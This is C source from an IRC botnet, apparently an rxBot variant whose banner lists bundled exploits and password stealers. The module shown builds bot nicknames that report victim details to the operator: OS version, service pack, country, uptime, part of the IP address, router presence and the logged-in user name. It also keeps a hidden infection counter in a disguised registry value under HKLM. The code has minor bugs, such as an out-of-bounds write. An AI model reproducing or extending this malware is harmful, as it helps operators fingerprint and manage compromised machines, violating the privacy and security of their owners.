/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
RNICK rnick[]={
	#ifndef NO_REALNICK
	{"real", REALNICK, rndnickreal},
	#endif
	{"const", CONSTNICK, rndnickconst},
	{"letter", LETTERNICK, rndnickletter},
	{"comp", COMPNICK, rndnickcomp},
	{"country", COUNTRYNICK, rndnickcountry},
	{"os", UPOSNICK, upnickos},
	{"funky", FUNKYNICK, Dnick}
};
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REALNICK
#include "nicklist.h"
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *rndnickreal(char *strbuf)
{
	srand(GetTickCount());

    _snprintf(strbuf, MAXNICKLEN, "%s", nicklist[rand()%(sizeof(nicklist) / sizeof(char *))]);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
    	
	return (strbuf);
}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *rndnickconst(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
  
	return (strbuf); 
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *rndnickletter(char *strbuf)
{	
    srand(GetTickCount());	

	int randlen = (rand()%3)+maxrand;
	
	for (int i=0; i < randlen; i++) 
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *rndnickcomp(char *strbuf) 
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;
 
    srand(GetTickCount());
 
	if(!GetComputerName(lpszCompName, &cchBuff)) 
		lpszCompName="PC";
 
	for (i=65;i<91;i++) 
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood) 
		lpszCompName="PC";
    _snprintf(strbuf, MAXNICKLEN, lpszCompName);

    for (i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
 
	return (strbuf);
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *rndnickcountry(char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s|", temp);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}
//////////////////////////////////////////////////////////////////////////////////
DWORD GetBotCount() {
	int count = 1;
	HKEY hKey;	
	DWORD dwValue, dwDisposition, dwSize;
	char path[] = "SOFTWARE\\Microsoft\\Windows";
	char value[] = "WinCount";

	fRegCreateKeyEx(HKEY_LOCAL_MACHINE, path,
		0,NULL,0,KEY_ALL_ACCESS,NULL, &hKey,&dwDisposition);

	
	if(fRegQueryValueEx(hKey, value, NULL, NULL, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
		fRegSetValueEx(hKey, value, 0, REG_DWORD, (LPBYTE)&++dwValue, sizeof(DWORD));
		return dwValue;
	}
	else {
		fRegSetValueEx(hKey, value, 0, REG_DWORD, (LPBYTE)&count, sizeof(DWORD));
		return 0;
	}
	return -1;
}

BYTE RouterCheck() {
	WORD wVersionRequested;
	WSADATA wsaData;
	char name[255];
	char ip[16], fip[4];
	PHOSTENT hostinfo;

	wVersionRequested = MAKEWORD( 2, 0 );
	
	if ( WSAStartup( wVersionRequested, &wsaData ) == 0 ) {
		if( gethostname ( name, sizeof(name)) == 0) {
			if((hostinfo = gethostbyname(name)) != NULL) {
				strcpy(ip, inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list));
			}
		}
		else {
			WSACleanup();
			return NULL;
		}
		WSACleanup();
	}
	else return NULL;

	char *p;
	p = strchr(ip, '.');
	if(p == NULL) return NULL; //p-ip
	strncpy(fip, ip, p-ip);

	return (BYTE)atoi(fip);
}

//////////////////////////////////////////////////////////////////////////////////
char *upnickos(char *strbuf)
{
	char temp[10];
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	//SYSTEM_INFO sysinfo;

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "[98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "[ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "[2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "[XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) {
		if (verinfo.dwPlatformId == VER_NT_WORKSTATION) os = "[XP";
		else os = "[3S";
	}
	else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 0) os = "[VI";
	else os = "---";

	_snprintf(strbuf,MAXNICKLEN,"%s-",os);

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s%s]", strbuf, temp);

	unsigned int hours = GetTickCount();
	hours/=1000;
	hours/=60;
	hours/=60;
	//GetSystemInfo(&sysinfo);
	//sysinfo

	if(hours>999) strcat(strbuf, "TOP-");
	else _snprintf(strbuf, MAXNICKLEN, "%s%03d-", strbuf, hours);
	//_snprintf(strbuf, MAXNICKLEN, "%s%04d-[_", strbuf, GetCPUSpeed());
	_snprintf(strbuf, MAXNICKLEN, "%s%04d", strbuf, GetCPUSpeed());

/*	unsigned char r = RouterCheck(sock);
	if(r == 10 || r == 192) { //check for router
		strcat(strbuf, "-R-");
		maxrand--;
	}*/
	BYTE r = RouterCheck();
	if(r == 10 || r == 192) {
		//strcat(strbuf, "-R-");
		strcat(strbuf, "[^]");
		maxrand--;
	}

    for (int i=0;i < maxrand;i++)
		//sprintf(strbuf, "%s%03dH-%i", strbuf, hours, rand()%10);
		_snprintf(strbuf, MAXNICKLEN, "%s[%c]", strbuf, /*rand()%10*/rand()%('Z'-'A')+'A'); //example of final nick: XP-USA|024-3561694

	maxrand++; //fix bug

	DWORD gbc = GetBotCount();
	if(gbc < 0) strcat(strbuf, "--^--"); //was there no 
	else if(!gbc) strcat(strbuf, "-NEW-");
	else if(gbc > 999) strcat(strbuf, "-999-");
	else _snprintf(strbuf, MAXNICKLEN, "%s-%03d-", strbuf, gbc);

	return (strbuf);
}
#if 0 //uninstall function is now not complete since it will leave info (how many times bot has booted) behind,
char *upnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	char days[8];
	unsigned int ud=GetTickCount()/86400000;
	sprintf(days,"%.2d",ud);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "???";

	_snprintf(strbuf,MAXNICKLEN,"|%.2d|%s|",ud, nickconst);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *prefixnick(char *strbuf)
{
	char tmpbuf[MAXNICKLEN];
	
	unsigned int days = GetTickCount() / 86400000;
	if (days > 100)
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s", days, ((fFindWindow("mIRC",0))?(""):("")));
	else
		sprintf(tmpbuf, ((fFindWindow("mIRC",0))?(""):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]", days);
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *rndnick(char *strbuf, int type, BOOL prefix, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(strbuf);
			break;
		}

	return ((prefix)?(prefixnick(strbuf)):(strbuf));
}

void RetrieveNick(char *buf) {
	DWORD cchBuff = 256; 
	if(fGetUserName)
		fGetUserName(buf, &cchBuff);
}

char *Dnick(char *strbuf)
{
	char *os="", *sp="";

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); 
	GetVersionEx(&verinfo); 

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "23";
	else os = "UN";

	if (strcmp(verinfo.szCSDVersion, "\0") == 0) sp = "SP0";
	else if (strstr(verinfo.szCSDVersion, "1") != NULL) sp = "SP1";
	else if (strstr(verinfo.szCSDVersion, "2") != NULL) sp = "SP2";
	else if (strstr(verinfo.szCSDVersion, "3") != NULL) sp = "SP3";
	else if (strstr(verinfo.szCSDVersion, "4") != NULL) sp = "SP4";
	else sp = "UNK";

	srand(GetTickCount());

	//_snprintf(strbuf, MAXNICKLEN, "%s|%s|%s|%s|%s|%s|", temp, os, sp, up, cpu, ip);

	//_snprintf(strbuf, MAXNICKLEN, "[%s|%s|%s|%s|%s%s|%s]-"ifnew, up, firstiptemp, os, sp, Currentuser);
	//_snprintf(strbuf, MAXNICKLEN, "[%s|%s|%s|%s|%s%s|%s"ifnew, up, firstip, temp, os, sp, Currentuser);
	//_snprintf(strbuf, MAXNICKLEN, "test");
	strbuf[0] = NULL; 

	/* Add 'N' if bot is NEW */
	DWORD gbc = GetBotCount(); 
	if(gbc == 0) strcat(strbuf, "N");
	else strcat(strbuf, "|");

	/* Add Uptime in Days */ 
	unsigned int days = GetTickCount();
	days/=1000;
	days/=60;
	days/=60; 
	days/=24;

	_snprintf(strbuf, MAXNICKLEN, "%s%02d|", strbuf, days);

	/* Add First Part of IP */
	unsigned char IP;
	IP = RouterCheck();
	_snprintf(strbuf, MAXNICKLEN, "%s%d|", strbuf, IP);


	/* Add Country Tag */	
	char ctry[5];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, ctry, sizeof(ctry));
	strcat(strbuf, ctry);

	/* Add OS/Info */
	_snprintf(strbuf, MAXNICKLEN, "%s|%s%s|", strbuf, os, sp);

	/* Add Current User */
	DWORD cchBuff = 256; 
	char CurrentUser[256];
	if(fGetUserName(CurrentUser, &cchBuff) != 0) {
		if(strlen(CurrentUser) > 13) {
			CurrentUser[13] = NULL;
		}
		strcat(strbuf, CurrentUser); 
	}
	else strcat(strbuf, "ERROR");

	/* Add 2 Random Chars */
	char random[3];
	random[0] = '|';
	random[1] = rand()%('Z'-'A')+'A';
	random[2] = rand()%('Z'-'A')+'A';
	random[3] = NULL;
	strcat(strbuf, random);

	//MessageBox(0, strbuf, strbuf, MB_OK);

	return (strbuf);
}
